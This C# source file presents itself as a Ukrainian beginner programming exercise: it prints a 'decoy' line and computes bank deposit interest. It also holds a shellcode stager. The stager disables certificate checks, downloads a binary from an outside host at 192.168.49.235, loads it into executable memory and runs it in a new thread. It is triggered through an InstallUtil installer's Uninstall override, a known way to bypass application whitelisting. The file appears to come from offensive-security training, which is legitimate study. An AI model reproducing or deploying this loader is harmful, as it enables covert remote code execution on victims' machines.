using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SliverStager
{
    public class Stager
    {
        public static void Main()
        {
            Console.WriteLine("decoy");
            System.Console.OutputEncoding = System.Text.Encoding.UTF8;

            double c = 31.1111;
            double e = 2.718;

            System.Console.WriteLine("1. Вивести на дисплей число с точністю до сотих: {0:F2}", c);
            System.Console.WriteLine("2. Вивести на дисплей число e  с точностю до десятих: {0:F1}", e);
            System.Console.WriteLine("3. Вивести в одному рядку числа 1, 13 и 49 с одним пробілом між ними: {0} {1} {2}", 1, 13, 49);
            System.Console.WriteLine("4. Вивести на экран числа 50 и 10 одне під одним: \n{0}\n{1}", 50, 10);

            System.Console.WriteLine("5. Написати програму виведення  на дисплей наступної інформації:");
            int t, v, x, y;
            System.Console.Write("Введiть t -> ");
            t = System.Convert.ToInt32(System.Console.ReadLine());
            System.Console.Write("Введiть v -> ");
            v = System.Convert.ToInt32(System.Console.ReadLine());
            System.Console.Write("Введiть x -> ");
            x = System.Convert.ToInt32(System.Console.ReadLine());
            System.Console.Write("Введiть y -> ");
            y = System.Convert.ToInt32(System.Console.ReadLine());
            System.Console.WriteLine("а) 5 10  б   100 {0}  в) {1} 25", t, x);
            System.Console.WriteLine("   7 см  )   1949      {0} {1}", x, y);
            System.Console.WriteLine("             {0}", v);

            System.Console.WriteLine("6. Підприємство поклало в банк на депозитний рахунок суму в S тисяч гривень під 40 % річних Яку суму зніме підприємство в кінці року?");
            System.Console.Write("Введiть S -> ");
            double S = System.Convert.ToDouble(System.Console.ReadLine());
            double result = S + (S / 100 * 40);
            System.Console.WriteLine("Яку суму зніме підприємство в кінці року = {0} тисяч гривень.", result);

        }
        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            Console.WriteLine("donwloading!");
            byte[] shellcode = client.DownloadData("http://192.168.49.235/osep.bin");

            UInt64 funcAddr = VirtualAlloc(0, (UInt64)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt64 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            Console.WriteLine("executing!");
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("waited!");
            return;
        }

        private static UInt64 MEM_COMMIT = 0x1000;
        private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt64 VirtualAlloc(UInt64 lpStartAddr, UInt64 size, UInt64 flAllocationType, UInt64 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt64 lpThreadAttributes,
          UInt64 dwStackSize,
          UInt64 lpStartAddress,
          IntPtr param,
          UInt64 dwCreationFlags,
          ref UInt64 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt64 WaitForSingleObject(
          IntPtr hHandle,
          UInt64 dwMilliseconds
        );
    }


    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Console.WriteLine("install");
            Stager.DownloadAndExecute();
        }
    }
}

